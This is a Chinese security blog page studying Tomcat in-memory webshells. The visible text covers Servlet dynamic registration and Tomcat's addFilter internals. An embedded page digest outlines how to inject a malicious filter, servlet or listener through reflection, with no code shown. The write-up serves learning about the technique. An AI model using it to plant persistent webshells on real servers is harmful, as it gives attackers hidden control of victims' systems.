<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>tomcat内存马学习（未完全） | stoocea</title><meta name="author" content="stoocea"><meta name="copyright" content="stoocea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="tomcat内存马学习（未完全）"><meta name="application-name" content="tomcat内存马学习（未完全）"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="tomcat内存马学习（未完全）"><meta property="og:url" content="http://example.com/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html"><meta property="og:site_name" content="stoocea"><meta property="og:description" content="测试前的小补充Servlet API提供的动态注册机制,2013就发布了这一项特性的使用方法serlvet,listener,filter是由javax.servlet.ServletContext去加载的,不论你是XML配置文件还是Annotation注解去配置,都是由web容器进行初始化,读取其"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg"><meta property="article:author" content="stoocea"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg"><meta name="description" content="测试前的小补充Servlet API提供的动态注册机制,2013就发布了这一项特性的使用方法serlvet,listener,filter是由javax.servlet.ServletContext去加载的,不论你是XML配置文件还是Annotation注解去配置,都是由web容器进行初始化,读取其"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: stoocea","link":"链接: ","source":"来源: stoocea","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'stoocea',
  title: 'tomcat内存马学习（未完全）',
  postAI: '',
  pageFillDescription: '测试前的小补充, Filter型内存马, FIlter注册方式, filter注册探索, addfilter的探索, Filterchain探索, 实现前的流程分析, dofilter之后, 访问dofilter之前, 接上流程的addfilter, 攻击流程, servlet型内存马, Servlet创建流程, Servlet内存马编写, .java实现, .jsp实现, listener型内存马, Listener基础代码实现以及流程分析, 基础代码实现, 流程分析测试前的小补充提供的动态注册机制就发布了这一项特性的使用方法是由去加载的不论你是配置文件还是注解去配置都是由容器进行初始化读取其中的配置信息然后在容器中注册本身就包含当前容器中的各项配置信息允许用用动态进行注册并在容器初始化的时候进行动态注册具体实现的方法可以看类中的等方法当然这里只是指为例其他中间件在代码中有部分实现不同型内存马过滤器是中最常见的技术之一主要是被用来处理静态资源访问权限控制记录日志等附件功能一次请求进入服务器之后会先经过对用户请求进行预处理再给处理类比框架中的中间件注册方式通常情况下配置在配置文件和注解中如果想要在其他代码中注册主要通过以下几种方式使用的方法进行注册使用的方法在服务器启动时注册使用的方法在初始化时进行注册非动态这里我们只讨论虽说后两种注册方法也会在后续学到就是了注册探索的探索首先先看方法在类中注释里看到了它的作用用在调用方法时向实例化一个指定到类也就是说在我们调用方法的目的是为了创建一个新的而它的实现就是方法负责给实例化一个指定的类注释中还写到说如果这个传递给的方法没有在中或者中声明而且也没有用注解的话则会抛出异常这个描述我们之后会遇到接下来看方法总计三个三个的接收参数其实都差不多对象字符串子类的对象提供了不同场景下添加的功能返回均是实际上就是对象之前基础的时候我们学习到三种其实是一个接口它的具体实现类是那我们接下来就看看具体实现类中的方法这里图用的是大佬的图我自己的看着很闹心此时版本为这个方法在判断是否为空以及的是否为程序刚启动的之后就调用的方法根据来创建一个新的当然这里的创建方法实际上是在判断中是否有对应的存在之后判断这个是否为空如果为空说明这个是新的逻辑开始实例化一个新的并将置放进去之后将新创建的储存在了中的一个中由于此时我们的传进来的肯定是所以之后调用完之后直接就了一个返回并没有将我们指定加载的对象存入单纯只调用这个肯定是不能完成自定的注册的而且在刚开始的时候添加了一个状态标记如果此时程序处于运行状态就不给我们添加了这个时候返回去想能不能直接操控探索在中的实现是这个类确实提供了一个方法添加该方法接受一个对象然后将其放在中看上去很行但由于每次请求需要执行的都是动态获取的所以这条路也不好走我们重新捋一遍是如何处理一次请求对应的的在的方法中大致流程如下在中获取到并且遍历匹配地址和请求是否匹配如果匹配则在中根据中的查找对应的找到之后就将其加入到中后续循环中的全部通过方法获取并执行各中的方法通过上述流程我们能够知道每次请求的都是动态匹配和生成的如果想要添加一个就必须往中的至少得让程序知道你这存在这么一个添加键值对且中添加保证能获取到的配置信息这样程序在创建时就能够找到添加的了上一小节的中完成了对初始化并存在了的中走到逻辑的时添加的那我们这个是怎么配置到其他参数与中的呢在的方法生成了而在的方法生成了发现这两者信息都是从中获取的整理上述逻辑之后我们理一下在应用程序中动态添加一个的条件和思路首先肯定要创建好为此必须调用的方法而我们在添加新之前要经过一个状态检查正在运行的程序是不能添加新的所以要用反射给他改一下表示运行状态的参数改完之后肯定还要改回来调用的方法生成调用的生成为了保证不出现意外状况我们将恶意放在的第一位可以自己修改中的顺序也可以自己调用中的方法直接放到的第一位基于以上思路开始实现流程实现前的流程分析首先先构建一个项目项目结构如下这里记得建在目录下然后就是各文件内容就不看了初始化完成执行了方法之后运行有的师傅是在分析之前有的是在分析之后的流程之后这里我们都分析一遍师傅的流程然后单步跟进直接来到了类方法的最后部分方法在此之前的部分是在进行全局安全服务是否开启的判断然后继续跟进这里看到了熟悉的我们之前分析过最终是从的方法生成的这里就按住不表了知道就好这里的有两个一个是系统自带的一个是我们自己创建的之后的流程循环遍历各个的方法了到最后一个的时候就会调用方法了这里跟我们之前学的的生命周期代码调试的实现源码没下下来导致调试出现了一些错误是一致的之后的内容总结一下根据来加载然后循环遍历的方法调用在最后一个的方法被调用之后才调用的方法访问之前分析之前的内容是为了弄懂我们该从哪下手将我们的写入进去也就是找到是如何被创建的我们刚才的调试界面前面这一串都是在创建虽然大部分都是是在调用但我们之前也分析过了的几个注册方式以及等之前的流程就不说了对我们分析的流程没影响的容器中处理的过程我们直接到的方法再跟进发现来到类的方法发现接下来就是循环调用了我们来到最后一个也就是类的方法在这里执行了一段的方法继续跟进我们直接跳到最后两端这里前面对象创建好之后开始调用方法到就是我们之前分析注册的地方了接上流程的根据前面的分析在执行最开始会进行一个判断也就是我们当前程序是否在运行如果在运行就不给我们追加了这个方法的主要作用是为了创建一个我们恶意的因为最终和的内容都是从来的所以我们考虑在这里用反射改一下运行状态参数先创建好之后再改回去就行然后就是的方法生成调用的生成为了保证不出现意外状况我们将恶意放在的第一位可以自己修改中的顺序也可以自己调用中的方法直接放到的第一位攻击流程抓住一个点吧不论是还是都是来自于它里面的三个变量包含所有过滤器和映射的关系包含所有过滤器以及内部变量包含所有与对应的信息以及实例我们最终加载是根据里面的信息进行添加的所以这里需要着重说一下的成员变量是一个对象这里的键和值分别是什么呢键是名称值是对应的而对象里面则存储了实例该实例在中注册信息以及所以要构造出内存马就必须满足的成员变量现在开始正式写整体思路是先获取然后获取我们的再设置以及首先先把恶意写一下然后写一个路由待会访问这个路由就能够将我们的恶意注入了在看整体的之前呢我们整体拆分成几个部分来分析要获取到就首先得想办法获取到类反射调用即可这部分得循环调用才能到之后的话就是正常的获取了中的然后就是将恶意类复制过来就行或者将其字节码文件一下传递过来也行代码演示就不贴了后续会有完整的现在我们只是获取到了而要想真正创建一个放到中必须满足两个条件一是我们要有相关的能够从中获取相关配置信息创建一个二是我们在必须要有路由这个键值对访问的到才能让程序知道有这个所以接下来的工作就是创建这两个东西的很好解决一个和就能解决主要是他是一个键值对变量键是名值是而的创建又需要所以在创建时的思路就是先把创建好之后再把创建好然后再构造即可创建如下反射获取设置名等参数将的类和名都要放进去然后再调用将我们刚才构建好的添加肯定也要存入的然后是反射获取设置到时候要访问的拦截路径调用将我们的设置成第一个拦截最后是反射获取在构造的时候传入我们的这里是紧接着我们上面提前构造的好的整体如下反射获取获取到中的因为可能访问这个路由不止一次循环写马没必要了判断一下就行反射获取设置名等参数将的类和名都要放进去然后再调用将我们刚才构建好的添加反射获取设置到时候要访问的拦截路径调用将我们的设置成第一个拦截反射获取在构造的时候传入我们的我们实验一下首先访问生成恶意的路由提示已经进去了然后里面我们设置的路由是也就是所有路径这个时候我们任意访问之前写过的路由然后加上的参数这里用专业版生成项目会自带一个路由我们就拿它来演示写入成功稍微总结一下型内存马的内容总的过程是如何植入新的想要植入新的我们分析出来的方法是在创建的过程中植入也就是这个方法他会根据来生成新然后根据来建立路由与的关系也就是访问哪些路由能够经过这个所以我们接下来就是创建号和简单把我们的实例和路由传进去即可分为与组成键值对所以任务就是创建好与即可型内存马注意这里的和有所区别依然还是要了解如何添加新的流程我们可以看看的实现类他里面有关于新的生成方法这里还是看看佬的源码图片我自己的不是很清晰其实跟我们之前看的的内容是差不多逻辑的先判断我们的要创建的是否为空然后判断应用程序状态然后也是在中查找是否已经有了该如果有就直接调如果没有就创建一个放入这里跟的创建一个的内容很像那其实就很自然的想到它是如何加载到我们的以及如何定位到的的方法依然调用了中的方法这个的键值对是路径和对象同时也在中添加路径和的映射创建流程现在本地来测试一下的过程首先先写一个测试基础恶意类也配置一下然后我们把断点打在方法开启服务之后路由访问发现前面已经经过了很多流程之前的基础应该还有印象发现了几个熟悉的字样跟我们的与外界交互的流程是一样的上面这段流程其实跟我们这次分析怎么最终通过来获取配置信息加载联系不是很大这里就不跟进之前的流程了总结一下就是获取到外部的请求信息包之后解析然后将其转化为对象在通过转化为对象传给容器进行处理里面包含我们的我们移动到读取配置信息加载的流程开始直接来到方法关于创建的地方这里是首先调用因为在中是必须用包起来的所以想要创建一个就必须先创建一个还注意到调用的的也就是不论是还是和我们想要创建一个新的就必须和打交道他也是整个三大件创建的相关核心类我们在这里下个断点调试一下运行他会断在这里现在加载的是他自带的一些就拿这个默认的举例下一步就是将这个的放到里面然后开始获取中的内容将指定的类的全类名放进去现在的建立载入了和指定加载的全类名之后被到了中其实上述过程就是在读取中的信息的过程根据的结构来一步一步加载进去的加载则是在后面到这里其实的注册已经完毕了我们总结一下动态创建的条件通过方法创建对象设置的属性设置的全类名设置也就是路径和对应关系然后将装载了信息的通过方法添加到中经历过这些进程之后就算是注册完毕了但是还没有实例化这个只能等我们去访问路径的时候才会实例化这个这也被称为的懒加载机制这个机制的主要方法实关于属性值的设置当我们的这个属性值大于等于时表示我们这个容器现在正在被访问需要加载正数值越小启动的优先级越高内存马编写收束一下前文的关系我们跟进了正式访问之前的流程也就是的工作然后直接来到了通过注册的地方了解到了的几个注册条件主要是创建了一个包含了我们的该有的信息把他放到了中所以接下来的工作创建好带有恶意信息的然后将其到的中然后设置好与路由的实现这里两个是为了得到将我们的恶意的配置信息全类名以及名字对应都配置进调用的将刚才配置好的存入这个版本的版本高了好像会报的错这里不是很推荐只用于理解写马的整体思路接下来写形式的实现首先获取到对象编写恶意创建对象装载恶意对象的配置信息将添加进并设置路由与的键值对整体的思路跟着注释先访问文件生成内存马然后访问我们的指定路由就行型内存马首先回顾一下什么是在的开发过程中其实总结起来就是和三大对象创建销毁或者往其中添加修改删除属性时自动执行代码的功能组件再说直白一点就是可以用监听器听客户端的请求以及服务端的操作然后也能够代码执行关于监听作用实现的三个对象其实体验下来是最适合做内存马的之后再说具体原因基础代码实现以及流程分析基础代码实现想要实现的功能就必须实现这个接口综合他的实现类来看跟我们服务器关系紧密且很容易实现的类我们可以采用这个类来写马我们看到这个类的定义内容有一段方法非常引人瞩目如下根据定义其实他监控了所有请求的生成也就是我们往对应路径发送请求时对应的就会触发这个方法这里我们自己创建一个设定访问路径以及被调用只要我们访问对应路径就会触发方法流程分析的配置信息都是通过读取的所以我们要去找实现了读取文件内容的类与方法在类下的方法其实不只是我们之前分析的和都要通过的内容去配置这个方法都一一实现了发现读取完之后会调用的我们继续跟进发现这里并没有实质性的添加它只是将这个的类名添加进了实际上真正添加进有效的方法是之后的方法你会发现它只有一个参数而且就是我们的实体那其实我们自己构造的内存马实现条件就很容易实现了写一个恶意类之后实例化后直接调用即可如下获取到撰写恶意类最后调用添加我们的恶意访问文件后之后任意请求都能触发监听器了',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-23 16:44:05',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">stoocea</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">tomcat内存马学习（未完全）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-11-23T09:50:51.000Z" title="发表于 2023-11-23 17:50:51">2023-11-23</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-11-23T08:44:05.705Z" title="更新于 2023-11-23 16:44:05">2023-11-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html"><header><h1 id="CrawlerTitle" itemprop="name headline">tomcat内存马学习（未完全）</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">stoocea</span><time itemprop="dateCreated datePublished" datetime="2023-11-23T09:50:51.000Z" title="发表于 2023-11-23 17:50:51">2023-11-23</time><time itemprop="dateCreated datePublished" datetime="2023-11-23T08:44:05.705Z" title="更新于 2023-11-23 16:44:05">2023-11-23</time></header><h2 id="测试前的小补充"><a href="#测试前的小补充" class="headerlink" title="测试前的小补充"></a>测试前的小补充</h2><p>Servlet API提供的动态注册机制,2013就发布了这一项特性的使用方法<br>serlvet,listener,filter是由javax.servlet.ServletContext去加载的,不论你是XML配置文件还是Annotation注解去配置,都是由web容器进行初始化,读取其中的配置信息,然后在容器中注册(context本身就包含当前web容器中的各项配置信息)</p>
<p>servlet 3.0 API允许用ServletContext用动态进行注册,并在web容器初始化的时候进行动态注册<br>具体实现的方法可以看ServletContext类中的add*&#x2F;create* 等方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/1.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/2.png"><br>当然这里只是指Tomcat为例,其他中间件在代码中有部分实现不同</p>
<h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><p>Filter过滤器是java中最常见的技术之一,主要是被用来处理静态web资源,访问权限控制,记录日志等附件功能.<br>一次请求进入服务器之后,会先经过filter对用户请求进行预处理,再给servlet处理(类比go gin框架中的中间件)</p>
<h3 id="FIlter注册方式"><a href="#FIlter注册方式" class="headerlink" title="FIlter注册方式"></a>FIlter注册方式</h3><p>通常情况下,filter配置在配置文件和注解中,如果想要在其他代码中注册,主要通过以下几种方式</p>
<ol>
<li>使用ServletContext的addFilter&#x2F;createFilter方法进行注册</li>
<li>使用servletContextListener的contextInitialized方法在服务器启动时注册</li>
<li>使用servletContainerInitializer的onStarup方法在初始化时进行注册(非动态)<br>这里我们只讨论ServletContext(虽说后两种注册方法也会在后续学到就是了)</li>
</ol>
<h3 id="filter注册探索"><a href="#filter注册探索" class="headerlink" title="filter注册探索"></a>filter注册探索</h3><h4 id="addfilter的探索"><a href="#addfilter的探索" class="headerlink" title="addfilter的探索"></a>addfilter的探索</h4><p>首先先看createFilter方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/3.png"></p>
<p>在类中注释里看到了它的作用,”用在调用addFilter()方法时向ServletContext实例化一个指定到filter类”,也就是说,在我们调用addFilter()方法的目的是为了创建一个新的filter,而它的实现就是createFilter方法负责给 ServletContext实例化一个指定的filter类</p>
<p>注释中还写到说,如果这个ServletContext传递给ServletContextListener的ServletContextListener.contextInitialized 方法没有在web.xml中或者web-fragment.xml中声明，而且也没有用注解javax.servlet.annotation.WebListener的话，则会抛出UnsupportedOperationException 异常。这个描述我们之后会遇到</p>
<p>接下来看addFilter方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/4.png"><br>总计三个，三个的接收参数其实都差不多，FilterName，Filter对象&#x2F;className字符串&#x2F;Filter子类的class对象，提供了不同场景下添加filter的功能，返回均是FilterRegistration.Dynamic，实际上就是FilterRegistration对象</p>
<p>之前tomcat基础的时候我们学习到三种context，ServletContext其实是一个接口，它的具体实现类是ApplicationContext，那我们接下来就看看具体实现类中的addFilter方法<br>（这里图用的是SU18大佬的图，我自己的idea看着很闹心）此时Tomcat版本为 7.0.96<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/5.png"></p>
